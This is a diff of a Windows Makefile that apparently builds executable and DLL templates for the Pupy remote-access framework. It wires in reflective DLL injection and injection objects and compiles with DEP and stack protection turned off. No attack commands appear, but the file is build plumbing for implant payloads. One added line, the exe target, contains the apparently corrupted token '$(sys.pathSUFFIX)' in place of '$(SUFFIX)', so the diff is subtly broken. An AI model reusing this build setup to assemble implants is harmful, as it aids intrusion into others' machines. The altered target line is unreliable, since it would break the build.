@@ -31,18 +31,17 @@ PPARCH      := $(PPARCH)d
 else
 DEBUG_ADD   :=
 LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:windows /ENTRY:WinMainCRTStartup /LTCG user32.lib
+# LINKER_OPTS := /link /NXCOMPAT:NO /subsystem:console /LTCG user32.lib
 PPARCH      := $(PPARCH)
-CFLAGS      := $(CFLAGS) /O1 /GL /GS-
+CFLAGS      := $(CFLAGS) /Os /GL /GS-
 endif
 
 SECARGS     := "cl" ".xzdata"
 
-CFLAGS      := $(CFLAGS) /I..\\lzma /I..\\jvm
+CFLAGS      := $(CFLAGS) /I..\\common
 
 PYOBJS := \
-	_memimporter.obj \
 	MyLoadLibrary.obj \
-	Python-dynload.obj \
 	pupy_load.obj \
 	base_inject.obj
 
@@ -59,6 +58,11 @@ SHARED_OBJS := \
 APP_OBJS := \
 	main_exe.obj \
 	pupy.obj
+
+ifneq ($(DEBUG),)
+COMMON_OBJS += debug.obj
+endif
+
 
 ifeq ($(UNCOMPRESSED),)
 COMMON_OBJS += LzmaDec.obj
@@ -78,8 +82,6 @@ revision.h:
 import-tab.c import-tab.h: ../mktab.py
 	$(HOST_PYTHON) $(PFLAGS) $<
 
-Python-dynload.obj: import-tab.c import-tab.h
-
 resources/$(ARCH)/library.txt: ../gen_library_compressed_string.py resources/$(ARCH)/library.zip
 	$(HOST_PYTHON) ../gen_library_compressed_string.py $@ resources/$(ARCH)/library.zip
 
@@ -88,12 +90,6 @@ resources/$(ARCH)/library.zip: ../build_library_zip.py
 
 resources/$(ARCH)/library.c: ../gen_resource_header.py resources/$(ARCH)/library.txt resources/$(ARCH)/library.zip
 	$(HOST_PYTHON) ../gen_resource_header.py resources/$(ARCH)/library.txt $@ $(COMPRESSED) $(SECARGS)
-
-resources/bootloader.pyc: ../../pupy/packages/all/pupyimporter.py ../../pupy/pp.py ../gen_python_bootloader.py
-	$(PYTHON) ../gen_python_bootloader.py $(DEBUG_ADD)
-
-resources/bootloader.c: resources/bootloader.pyc ../gen_resource_header.py
-	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)
 
 resources/$(ARCH)/python27.dll: $(BUILDENV)/$(ARCH)/drive_c/Python27/python27.dll
 	@mkdir -p resources/$(ARCH)
@@ -109,30 +105,31 @@ resources/$(ARCH)/python27.c: resources/$(ARCH)/python27.dll ../gen_resource_hea
 resources/$(ARCH)/msvcr90.c: resources/$(ARCH)/msvcr90.dll ../gen_resource_header.py
 	$(HOST_PYTHON) ../gen_resource_header.py $< $@ $(COMPRESSED) $(SECARGS)
 
-pupy_load.c: resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c resources/bootloader.c revision.h
-
-
 ifeq ($(UNCOMPRESSED),)
-LzmaDec.obj: ../lzma/LzmaDec.c
+LzmaDec.obj: ../common/LzmaDec.c
 	$(CC) /c $(CFLAGS) $< /Fo$@
 endif
 
 %.obj: %.c
 	$(CC) /Fo$@ /I$(PYTHONPATH)\\include /c $(CFLAGS) $<
 
+%.obj: ../common/%.c
+	$(CC) /Fo$@ /I$(PYTHONPATH)\\include /c $(CFLAGS) $<
+
+
 ReflectiveLoader.obj: ReflectiveLoader.c
 	$(CC) /c $(CFLAGS) /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN \
 		/DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR /O2 /Ob1 $< /Fo$@
 
-pupy_load.obj: pupy_load.c resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c resources/bootloader.c revision.h
+pupy_load.obj: pupy_load.c resources/$(ARCH)/library.c resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c revision.h
 
-pupy.obj: pupy.c resources/$(ARCH)/library.c revision.h
+pupy.obj: pupy.c revision.h
 	$(CC) /c $(CFLAGS) $< /Fo$@
 
-pupy_shared.obj: pupy.c resources/$(ARCH)/library.c revision.h
+pupy_shared.obj: pupy.c revision.h
 	$(CC) /c $(CFLAGS) /D_PUPY_DLL $< /Fo$@
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe: $(PYOBJS) $(APP_OBJS) $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(sys.pathSUFFIX)exe: $(PYOBJS) $(APP_OBJS) $(COMMON_OBJS)
 	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS)
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
@@ -144,11 +141,6 @@ $(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: $(PYOBJS) $(SHARED_OBJS) $(C
 
 clean:
 	rm -f *.obj
-	rm -f *.pyo
-	rm -f *.pyc
-	rm -f resources/bootloader.pyc
-	rm -f resources/*.c
-	rm -f resources/$(ARCH)/*.c
 	rm -f $(PYOBJS) $(COMMON_OBJS)
 
 distclean: clean
